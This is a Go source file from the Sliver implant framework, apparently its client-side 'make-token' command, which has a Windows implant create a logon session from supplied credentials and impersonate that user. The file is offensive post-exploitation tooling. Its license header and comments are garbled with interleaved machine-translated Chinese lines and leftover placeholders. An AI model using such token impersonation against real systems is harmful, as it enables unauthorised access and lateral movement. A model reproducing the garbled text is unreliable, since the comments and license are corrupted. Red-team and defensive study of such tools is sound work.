package privilege

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox
	Copyright (C) 2021 Bishop Fox

	This program is free software: you can redistribute it and/or modify
	This 程序是免费软件：您可以重新分发它 and/or 修改
	it under the terms of the GNU General Public License as published by
	它根据 GNU General Public License 发布的条款
	the Free Software Foundation, either version 3 of the License, or
	Free Software Foundation，License 的版本 3，或
	(at your option) any later version.
	（由您选择）稍后 version.

	This program is distributed in the hope that it will be useful,
	This 程序被分发，希望它有用，
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	但是WITHOUT ANY WARRANTY；甚至没有默示保证
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	MERCHANTABILITY 或 FITNESS FOR A PARTICULAR PURPOSE. See
	GNU General Public License for more details.
	GNU General Public License 更多 details.

	You should have received a copy of the GNU General Public License
	You 应已收到 GNU General Public License 的副本
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
	与此 program. If 不一起，请参见 <__PH0__
*/

import (
	"context"

	"google.golang.org/protobuf/proto"

	"github.com/spf13/cobra"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

var logonTypes = map[string]uint32{
	"LOGON_INTERACTIVE":       2,
	"LOGON_NETWORK":           3,
	"LOGON_BATCH":             4,
	"LOGON_SERVICE":           5,
	"LOGON_UNLOCK":            7,
	"LOGON_NETWORK_CLEARTEXT": 8,
	"LOGON_NEW_CREDENTIALS":   9,
}

// MakeTokenCmd - Windows only, create a token using "valid" credentails
// 仅 MakeTokenCmd - Windows，使用 __PH0__ 凭据创建 token
func MakeTokenCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	username, _ := cmd.Flags().GetString("username")
	password, _ := cmd.Flags().GetString("password")
	domain, _ := cmd.Flags().GetString("domain")
	logonType, _ := cmd.Flags().GetString("logon-type")

	if _, ok := logonTypes[logonType]; !ok {
		con.PrintErrorf("Invalid logon type: %s\n", logonType)
		return
	}

	if username == "" || password == "" {
		con.PrintErrorf("You must provide a username and password\n")
		return
	}

	ctrl := make(chan bool)
	con.SpinUntil("Creating new logon session ...", ctrl)

	makeToken, err := con.Rpc.MakeToken(context.Background(), &sliverpb.MakeTokenReq{
		Request:   con.ActiveTarget.Request(cmd),
		Username:  username,
		Domain:    domain,
		Password:  password,
		LogonType: logonTypes[logonType],
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if makeToken.Response != nil && makeToken.Response.Async {
		con.AddBeaconCallback(makeToken.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, makeToken)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintMakeToken(makeToken, domain, username, con)
		})
		con.PrintAsyncResponse(makeToken.Response)
	} else {
		PrintMakeToken(makeToken, domain, username, con)
	}
}

// PrintMakeToken - Print the results of attempting to make a token
// PrintMakeToken - Print 尝试创建 token 的结果
func PrintMakeToken(makeToken *sliverpb.MakeToken, domain string, username string, con *console.SliverClient) {
	if makeToken.Response != nil && makeToken.Response.GetErr() != "" {
		con.PrintErrorf("%s\n", makeToken.Response.GetErr())
		return
	}
	con.Println()
	con.PrintInfof("Successfully impersonated %s\\%s. Use `rev2self` to revert to your previous token.", domain, username)
}
